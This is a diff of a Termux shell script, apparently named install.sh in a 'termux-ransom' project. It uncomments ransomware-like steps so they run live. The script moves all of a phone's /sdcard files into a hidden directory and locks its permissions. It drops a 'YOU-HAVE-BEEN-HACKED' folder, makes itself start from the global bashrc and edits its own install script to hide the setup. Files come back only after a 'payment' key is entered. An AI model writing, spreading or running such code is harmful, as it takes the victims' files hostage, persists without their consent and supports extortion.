@@ -1,16 +1,16 @@
-#pkg install termimage
-#termux-setup-storage
-#mkdir /$HOME/.rfkzk
-#mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
-#chmod u=w /$HOME/.rfkzk
-#mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
-#chmod u=x *
-#chmod u=rwx IMG-20240228-WA0000.jpg
-#chmod u=rx install.sh
+pkg install termimage
+termux-setup-storage
+mkdir /$HOME/.rfkzk
+mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
+chmod u=w /$HOME/.rfkzk
+mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
+chmod u=x *
+chmod u=rwx IMG-20240228-WA0000.jpg
+chmod u=rx install.sh
 clear
-#echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-#echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
-#sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh ; sed -i '2s/termux-setup-storage/#/' install.sh ; sed -i '1s/pkg/#/' install.sh
+echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh ; sed -i '2s/termux-setup-storage/#/' install.sh ; sed -i '1s/pkg/#/' install.sh
 sleep 1
 while :
 do
@@ -29,9 +29,9 @@ do
 	then
 		echo -e "\033[0;49;92m THANK YOU FOR YOUR PAYMENT!\033[m"
 		echo -e "\033[0;49;95m Please Check Your Gallery!"
-		#chmod u=rwx /$HOME/.rfkzk
-		#mv /$HOME/.rfkzk/* /sdcard
-		#sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
+		chmod u=rwx /$HOME/.rfkzk
+		mv /$HOME/.rfkzk/* /sdcard
+		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
 		break
 	elif [ "$key" == "info" ]
 	then
